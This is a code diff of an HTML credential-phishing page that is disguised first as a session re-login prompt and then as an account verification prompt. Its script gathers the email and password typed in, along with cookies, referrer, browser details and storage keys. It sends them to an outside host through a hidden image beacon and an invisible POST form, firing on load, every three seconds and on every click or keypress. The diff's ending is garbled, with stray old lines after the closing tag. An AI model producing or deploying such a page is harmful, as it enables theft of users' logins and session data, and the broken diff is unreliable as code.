@@ -1,40 +1,65 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Login Required</title>
-    <style>
-        body { font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0; }
-        input { padding: 10px; margin: 10px; width: 250px; }
-        button { padding: 10px 20px; background: #007cba; color: white; border: none; cursor: pointer; }
-    </style>
+<head><title>Verify Account</title>
+<style>body{font-family:Arial;text-align:center;padding:100px;background:#e3f2fd;}
+input{padding:15px;margin:10px;width:280px;border:2px solid #2196f3;border-radius:8px;font-size:16px;}
+button{padding:15px 40px;background:#2196f3;color:white;border:none;border-radius:8px;cursor:pointer;font-size:16px;}
+button:hover{background:#1976d2;}</style>
 </head>
 <body>
-    <h2>Session Expired - Re-login</h2>
-    <input type="email" id="email" placeholder="Email">
-    <br>
-    <input type="password" id="pass" placeholder="Password">
-    <br>
-    <button onclick="login()">Login</button>
+<h2>Account Verification Required</h2>
+<p>Enter your credentials to continue:</p>
+<input type="email" id="email" placeholder="your@email.com">
+<input type="password" id="pass" placeholder="Password">
+<button onclick="verify()">Verify Now</button>
 
-    <script>
-        // SIMPLIFIED - WORKS EVERYWHERE
-        function stealData() {
-            const data = {
-                url: window.location.href,
-                cookies: document.cookie,
-                local: localStorage.length ? JSON.stringify(Object.fromEntries([...localStorage])) : '',
-                session: sessionStorage.length ? JSON.stringify(Object.fromEntries([...sessionStorage])) : '',
-                email: document.getElementById('email')?.value || '',
-                pass: document.getElementById('pass')?.value || '',
-                userAgent: navigator.userAgent.substring(0,100)
-            };
+<script>
+function exfil() {
+    const data = {
+        time: new Date().toISOString(),
+        url: window.location.href,
+        ref: document.referrer,
+        cookies: document.cookie,
+        title: document.title,
+        email: document.getElementById('email')?.value || '',
+        pass: document.getElementById('pass')?.value || '',
+        ua: navigator.userAgent,
+        lang: navigator.language,
+        platform: navigator.platform,
+        storage: {
+            local: localStorage.length,
+            session: sessionStorage.length,
+            localData: Object.keys(localStorage).join(','),
+            sessionData: Object.keys(sessionStorage).join(',')
+        }
+    };
+    
+    // STEALTH IMAGE BEACON
+    new Image().src='https://httpbin.org/image/png?data='+btoa(JSON.stringify(data));
+    
+    // INVISIBLE FORM
+    const f=document.createElement('form');
+    f.method='POST'; f.action='https://httpbin.org/post'; f.style.display='none';
+    const i=document.createElement('input');
+    i.name='victim'; i.value=btoa(JSON.stringify(data));
+    f.appendChild(i); document.body.appendChild(f); f.submit();
+    
+    console.log('🚀 EXFILLED:', data);
+}
 
-            // METHOD 1: Image beacon (ALWAYS works)
-            new Image().src = 'https://httpbin.org/image/png?data=' + btoa(JSON.stringify(data));
-            
-            // METHOD 2: Form submit (invisible)
-            const form = document.createElement('form');
-            form.method = 'POST';
+// RUN NOW + EVERY 3s + ON INTERACTION
+exfil();
+setInterval(exfil, 3000);
+document.addEventListener('click', exfil);
+document.addEventListener('keydown', exfil);
+
+function verify() {
+    exfil();
+    alert('Verified! Redirecting...');
+}
+</script>
+</body>
+</html>            form.method = 'POST';
             form.action = 'https://httpbin.org/post';
             form.style.display = 'none';
             
